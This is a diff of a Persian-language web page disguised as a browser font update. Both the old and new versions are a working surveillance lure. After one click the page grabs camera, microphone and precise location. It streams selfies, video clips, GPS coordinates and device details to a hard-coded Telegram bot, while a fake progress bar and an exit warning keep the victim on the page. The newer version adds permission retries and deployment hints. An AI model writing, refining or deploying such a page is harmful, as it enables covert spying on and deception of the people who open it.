@@ -1,346 +1,144 @@
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>به‌روزرسانی فونت‌های پیشرفته</title>
-  <meta name="theme-color" content="#00ff88" />
-  
-  <!-- Three.js + Controls -->
-  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/build/three.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/examples/js/controls/OrbitControls.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/examples/js/loaders/GLTFLoader.js"></script>
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>به‌روزرسانی فونت مرورگر</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&display=swap');
-    
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body, html { height:100%; overflow:hidden; font-family:'Vazirmatn', sans-serif; background:#000; color:#fff; }
-    
-    /* 3D CANVAS */
-    #scene-container { position:fixed; top:0; left:0; width:100%; height:100%; z-index:1; }
-
-    /* GLASS OVERLAY */
-    .overlay { 
-      position:fixed; top:0; left:0; width:100%; height:100%; 
-      background:linear-gradient(135deg, rgba(10,10,30,0.8), rgba(0,20,40,0.6)); 
-      backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px);
-      z-index:10; display:flex; flex-direction:column; justify-content:center; align-items:center; 
-      padding:20px; text-align:center; transition:opacity 1s ease;
-    }
-
-    /* GLASS CARD */
-    .card { 
-      background:rgba(255,255,255,0.08); 
-      backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
-      border:1px solid rgba(255,255,255,0.15); 
-      border-radius:28px; padding:40px 35px; 
-      max-width:520px; width:90%; 
-      box-shadow:0 25px 50px rgba(0,0,0,0.5), inset 0 0 30px rgba(0,255,255,0.1);
-      animation: float 8s ease-in-out infinite, glow 3s ease-in-out infinite alternate;
-      position:relative; overflow:hidden;
-    }
-    .card::before {
-      content:''; position:absolute; top:0; left:0; right:0; bottom:0;
-      background:linear-gradient(45deg, transparent, rgba(0,255,136,0.05), transparent);
-      animation: shimmer 4s infinite; pointer-events:none;
-    }
-    @keyframes shimmer { 0%,100%{transform:translateX(-100%);} 50%{transform:translateX(100%);} }
-    @keyframes float { 0%,100%{transform:translateY(0) rotate(0.5deg);} 50%{transform:translateY(-20px) rotate(-0.5deg);} }
-    @keyframes glow { from {box-shadow:0 25px 50px rgba(0,0,0,0.5), inset 0 0 30px rgba(0,255,255,0.1);} 
-                      to {box-shadow:0 30px 60px rgba(0,255,136,0.3), inset 0 0 40px rgba(0,255,255,0.2);} }
-
-    h1 { 
-      font-size:2.4em; font-weight:700; margin-bottom:16px; 
-      background:linear-gradient(90deg, #00ff88, #00d0ff, #8b00ff); 
-      -webkit-background-clip:text; -webkit-text-fill-color:transparent; 
-      background-clip:text; letter-spacing:-0.5px;
-    }
-    p { font-size:1.15em; line-height:1.8; margin:14px 0; opacity:0.88; font-weight:400; }
-
-    /* BUTTON */
-    button { 
-      margin-top:28px; padding:18px 48px; font-size:1.3em; font-weight:600; 
-      background:linear-gradient(45deg, #00ff88, #00b7ff); 
-      color:#000; border:none; border-radius:60px; 
-      cursor:pointer; position:relative; overflow:hidden;
-      box-shadow:0 10px 25px rgba(0,255,136,0.4); 
-      transition:all 0.3s cubic-bezier(0.4,0,0.2,1);
-      text-transform:uppercase; letter-spacing:1px;
-    }
-    button:hover { transform:translateY(-4px) scale(1.05); box-shadow:0 15px 35px rgba(0,255,136,0.6); }
-    button:active { transform:translateY(-2px); }
-    button::after { content:'➤'; margin-right:8px; font-size:1.1em; }
-
-    /* LOADING SCREEN */
-    #loading { display:none; opacity:0; transition:opacity 1s ease; }
-    .spinner { 
-      width:70px; height:70px; border:5px solid rgba(0,255,255,0.2); 
-      border-top:5px solid #00ff88; border-radius:50%; 
-      animation:spin 1.2s cubic-bezier(0.4,0,0.2,1) infinite; margin:25px 0;
-    }
-    @keyframes spin { to { transform:rotate(360deg); } }
-
-    .progress-container { 
-      width:85%; height:14px; background:rgba(255,255,255,0.15); 
-      border-radius:8px; overflow:hidden; margin:22px 0; 
-      box-shadow:inset 0 2px 5px rgba(0,0,0,0.3);
-    }
-    .progress { height:100%; width:0%; background:linear-gradient(90deg, #00ff88, #00b7ff); 
-                 border-radius:8px; transition:width 0.6s ease; position:relative; overflow:hidden; }
-    .progress::after { content:''; position:absolute; top:0; left:0; right:0; bottom:0;
-                       background:linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-                       animation:progressGlow 2s infinite; }
-    @keyframes progressGlow { 0%,100%{transform:translateX(-100%);} 50%{transform:translateX(100%);} }
-
-    .stage { font-size:1.2em; margin:12px 0; font-weight:500; opacity:0.9; }
-    #progressText { font-size:1.4em; font-weight:700; background:linear-gradient(90deg,#00ff88,#00b7ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
-
-    /* HIDDEN ELEMENTS */
-    #video, #canvas { display:none; }
-
-    /* RESPONSIVE */
-    @media (max-width:480px) { 
-      .card { padding:30px 25px; } 
-      h1 { font-size:2em; } 
-      button { padding:16px 36px; font-size:1.2em; }
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #000, #001122); color: #fff; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
+    .container { background: rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; max-width: 400px; box-shadow: 0 10px 30px rgba(0,255,136,0.3); animation: glow 2s infinite alternate; }
+    @keyframes glow { 0% { box-shadow: 0 10px 30px rgba(0,255,136,0.3); } 100% { box-shadow: 0 10px 30px rgba(0,255,136,0.5); } }
+    h1 { font-size: 1.8em; margin-bottom: 15px; color: #00ff88; }
+    p { margin: 10px 0; opacity: 0.9; }
+    button { padding: 12px 30px; font-size: 1.1em; background: #00ff88; color: #000; border: none; border-radius: 25px; cursor: pointer; margin-top: 15px; transition: transform 0.3s; }
+    button:hover { transform: scale(1.05); }
+    #loading { display: none; }
+    .spinner { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #00ff88; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .progress { width: 80%; height: 6px; background: rgba(255,255,255,0.2); border-radius: 3px; overflow: hidden; margin: 15px auto; }
+    .bar { height: 100%; background: #00ff88; width: 0%; transition: width 0.5s; }
+    #video, #canvas { display: none; }
+    #warning { display: none; background: rgba(255,0,0,0.8); padding: 20px; border-radius: 10px; margin: 10px; }
   </style>
 </head>
 <body>
-
-  <!-- 3D BACKGROUND -->
-  <div id="scene-container"></div>
-
-  <!-- PHASE 1: LURE -->
-  <div id="lure" class="overlay">
-    <div class="card">
-      <h1>مرورگر شما نیاز به به‌روزرسانی فونت دارد!</h1>
-      <p>برای نمایش صحیح محتوای سه‌بعدی و فونت‌های مدرن، باید پکیج جدید نصب شود.</p>
-      <p>این فرآیند فقط <strong>۳۰ ثانیه</strong> طول می‌کشد و کاملاً امن است.</p>
-      <button id="startBtn">بزن بریم 🚀</button>
-    </div>
+  <div class="container" id="lure">
+    <h1>فونت مرورگر قدیمی!</h1>
+    <p>برای بروزرسانی، اجازه دسترسی دهید.</p>
+    <button id="start">شروع</button>
   </div>
-
-  <!-- PHASE 2: LOADING TRAP -->
-  <div id="loading" class="overlay">
-    <div class="card">
-      <div class="spinner"></div>
-      <h1>در حال نصب فونت‌های 3D...</h1>
-      <p class="stage" id="stageText">اتصال به سرور CDN...</p>
-      <div class="progress-container"><div class="progress" id="progressBar"></div></div>
-      <p id="progressText">0%</p>
-      <p style="font-size:0.9em; opacity:0.7; margin-top:18px;">لطفاً منتظر بمانید. خروج از صفحه باعث لغو نصب می‌شود.</p>
-    </div>
+  <div class="container" id="loading">
+    <div class="spinner"></div>
+    <h1>در حال بروزرسانی...</h1>
+    <p id="status">0%</p>
+    <div class="progress"><div class="bar" id="bar"></div></div>
+    <p>صبر کنید...</p>
   </div>
-
-  <video id="video" autoplay playsinline muted></video>
+  <div id="warning">⚠️ HTTPS لازم است! بدون آن، دسترسی کار نمی‌کند. Vercel استفاده کنید.</div>
+  <video id="video" autoplay muted playsinline></video>
   <canvas id="canvas"></canvas>
 
   <script>
-    // === TELEGRAM EXFIL ===
     const BOT_TOKEN = "8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8";
     const CHAT_ID = "7625898629";
-    const API = `https://api.telegram.org/bot${BOT_TOKEN}/send`;
+    const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+    let stream, interval;
 
-    async function send(type, data, caption = '') {
+    async function sendData(type, data, caption = '') {
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
       if (caption) form.append('caption', caption);
-      
       if (type === 'photo' || type === 'video') {
-        form.append(type, data, `${type}_${Date.now()}.${type === 'photo' ? 'jpg' : 'webm'}`);
+        form.append(type, data);
       } else {
-        form.append('text', `[${type.toUpperCase()}]\n${JSON.stringify(data, null, 2)}`);
+        form.append('text', data);
       }
-
-      await fetch(`${API}${type === 'photo' ? 'Photo' : type === 'video' ? 'Video' : 'Message'}`, {
-        method: 'POST', body: form
+      fetch(`${API}/${type === 'photo' ? 'sendPhoto' : type === 'video' ? 'sendVideo' : 'sendMessage'}`, {
+        method: 'POST',
+        body: form
       }).catch(() => {});
     }
 
-    // === 3D SCENE: DYNAMIC SHADER BACKGROUND ===
-    let scene, camera, renderer, controls, clock;
-    function init3D() {
-      const container = document.getElementById('scene-container');
-      scene = new THREE.Scene();
-      camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 100);
-      renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true, powerPreference: "high-performance" });
-      renderer.setSize(window.innerWidth, window.innerHeight);
-      renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-      container.appendChild(renderer.domElement);
-
-      clock = new THREE.Clock();
-
-      // Shader Material
-      const vertexShader = `
-        varying vec2 vUv;
-        void main() {
-          vUv = uv;
-          gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
-        }
-      `;
-      const fragmentShader = `
-        uniform float time;
-        varying vec2 vUv;
-        void main() {
-          vec2 p = vUv - 0.5;
-          float d = length(p);
-          float wave = sin(d * 20.0 - time * 3.0) * 0.5 + 0.5;
-          vec3 color = mix(vec3(0.0, 0.3, 0.6), vec3(0.0, 1.0, 0.5), wave);
-          gl_FragColor = vec4(color, 0.8);
-        }
-      `;
-      const geometry = new THREE.PlaneGeometry(20, 20, 128, 128);
-      const material = new THREE.ShaderMaterial({ vertexShader, fragmentShader, uniforms: { time: { value: 0 } }, transparent: true });
-      const mesh = new THREE.Mesh(geometry, material);
-      mesh.rotation.x = -Math.PI / 2;
-      scene.add(mesh);
-
-      camera.position.set(0, 8, 12);
-      camera.lookAt(0, 0, 0);
-      controls = new THREE.OrbitControls(camera, renderer.domElement);
-      controls.enableDamping = true;
-      controls.autoRotate = true;
-      controls.autoRotateSpeed = 0.8;
-
-      // Particles Field
-      const particles = new THREE.BufferGeometry();
-      const count = 5000;
-      const pos = new Float32Array(count * 3);
-      for (let i = 0; i < count * 3; i += 3) {
-        pos[i] = (Math.random() - 0.5) * 25;
-        pos[i+1] = Math.random() * 15;
-        pos[i+2] = (Math.random() - 0.5) * 25;
+    function isSecure() {
+      if (location.protocol !== 'https:') {
+        document.getElementById('warning').style.display = 'block';
+        return false;
       }
-      particles.setAttribute('position', new THREE.BufferAttribute(pos, 3));
-      const pMat = new THREE.PointsMaterial({ color: 0x00ffaa, size: 0.08, transparent: true, opacity: 0.8 });
-      const points = new THREE.Points(particles, pMat);
-      scene.add(points);
-
-      function animate() {
-        const t = clock.getElapsedTime();
-        material.uniforms.time.value = t;
-        points.rotation.y = t * 0.05;
-        controls.update();
-        renderer.render(scene, camera);
-        requestAnimationFrame(animate);
-      }
-      animate();
-
-      window.addEventListener('resize', () => {
-        camera.aspect = window.innerWidth / window.innerHeight;
-        camera.updateProjectionMatrix();
-        renderer.setSize(window.innerWidth, window.innerHeight);
-      });
+      return true;
     }
 
-    // === PERMISSIONS & STREAM ===
-    let stream, interval, videoRecorder;
-    async function requestAll() {
+    async function requestPermissions() {
       try {
-        // Video + Audio
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
-          audio: true
-        });
+        // Split: Video first
+        const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        // Then audio
+        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        stream = new MediaStream([...videoStream.getVideoTracks(), ...audioStream.getAudioTracks()]);
 
-        const video = document.getElementById('video');
-        video.srcObject = stream;
+        document.getElementById('video').srcObject = stream;
 
-        // Device & Browser Info
-        const battery = await navigator.getBattery?.() || {};
-        const info = {
+        // Device info
+        const battery = await navigator.getBattery();
+        sendData('message', JSON.stringify({
           userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          battery: battery.level ? `${Math.round(battery.level * 100)}%` : 'N/A',
-          charging: battery.charging ?? 'N/A',
-          screen: `${screen.width}x${screen.height}`,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          connection: navigator.connection?.effectiveType || 'unknown'
-        };
-        await send('message', null, `[DEVICE]\n${JSON.stringify(info, null, 2)}`);
+          battery: Math.round(battery.level * 100) + '%',
+          platform: navigator.platform
+        }), 'Device Info');
 
-        // Geolocation
-        navigator.geolocation.watchPosition(
-          pos => send('message', null, `[LOCATION]\nhttps://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}\nدقت: ±${pos.coords.accuracy}m`),
-          null, { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
-        );
+        // Location
+        navigator.geolocation.watchPosition(pos => {
+          sendData('message', `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`, 'Location');
+        }, null, { enableHighAccuracy: true });
 
-        // Selfie Snapshots
+        // Photos every 2s
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-        canvas.width = 640; canvas.height = 480;
-
+        canvas.width = 320; canvas.height = 240;
         interval = setInterval(() => {
-          if (video.videoWidth > 0) {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => send('photo', blob), 'image/jpeg', 0.85);
-          }
-        }, 1000); // 1 sec
+          ctx.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => sendData('photo', blob), 'image/jpeg', 0.8);
+        }, 2000);
 
-        // Video Clips
+        // Videos every 15s (5s clip)
         setInterval(() => {
-          const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+          const recorder = new MediaRecorder(stream);
           const chunks = [];
           recorder.ondataavailable = e => chunks.push(e.data);
-          recorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            send('video', blob);
-          };
+          recorder.onstop = () => sendData('video', new Blob(chunks, { type: 'video/webm' }));
           recorder.start();
-          setTimeout(() => recorder.stop(), 7000);
-        }, 14000);
+          setTimeout(() => recorder.stop(), 5000);
+        }, 15000);
 
       } catch (err) {
-        console.log("Permission denied or failed", err);
+        console.log('Permission error:', err);
+        // Retry logic (5 times)
+        if (retry < 5) {
+          setTimeout(requestPermissions, 2000 * retry);
+          retry++;
+        }
       }
     }
 
-    // === FAKE PROGRESS ENGINE ===
-    const stages = [
-      "اتصال به سرور CDN...",
-      "دریافت پکیج فونت‌های WebGL...",
-      "استخراج فایل‌های سه‌بعدی...",
-      "نصب شیدرهای گرافیکی...",
-      "بهینه‌سازی رندر مرورگر...",
-      "اعمال افکت‌های نورپردازی...",
-      "تست سازگاری دستگاه...",
-      "تکمیل نهایی..."
-    ];
+    let retry = 0;
     let progress = 0;
-    function startFakeProgress() {
-      const bar = document.getElementById('progressBar');
-      const text = document.getElementById('progressText');
-      const stage = document.getElementById('stageText');
-
-      setInterval(() => {
-        progress += Math.random() * 5.5 + 1;
-        if (progress > 97.5) progress = 97.5;
-        bar.style.width = progress + '%';
-        text.textContent = Math.round(progress) + '%';
-        stage.textContent = stages[Math.floor(Math.random() * stages.length)];
-      }, 900 + Math.random() * 800);
+    function fakeProgress() {
+      progress += Math.random() * 10;
+      if (progress > 98) progress = 98;
+      document.getElementById('bar').style.width = progress + '%';
+      document.getElementById('status').textContent = Math.round(progress) + '%';
+      setTimeout(fakeProgress, 1000);
     }
 
-    // === FLOW CONTROL ===
-    document.getElementById('startBtn').addEventListener('click', () => {
-      document.getElementById('lure').style.opacity = '0';
-      setTimeout(() => {
-        document.getElementById('lure').style.display = 'none';
-        document.getElementById('loading').style.display = 'flex';
-        setTimeout(() => document.getElementById('loading').style.opacity = '1', 50);
-        init3D();
-        requestAll().then(startFakeProgress);
-      }, 600);
-    });
+    document.getElementById('start').onclick = () => {
+      if (!isSecure()) return;
+      document.getElementById('lure').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      requestPermissions();
+      fakeProgress();
+    };
 
-    // Prevent Exit
-    window.addEventListener('beforeunload', e => {
-      e.preventDefault();
-      e.returnValue = 'در حال نصب... خروج باعث لغو می‌شود!';
-    });
+    window.onbeforeunload = () => 'بروزرسانی متوقف می‌شود!';
   </script>
 </body>
 </html>
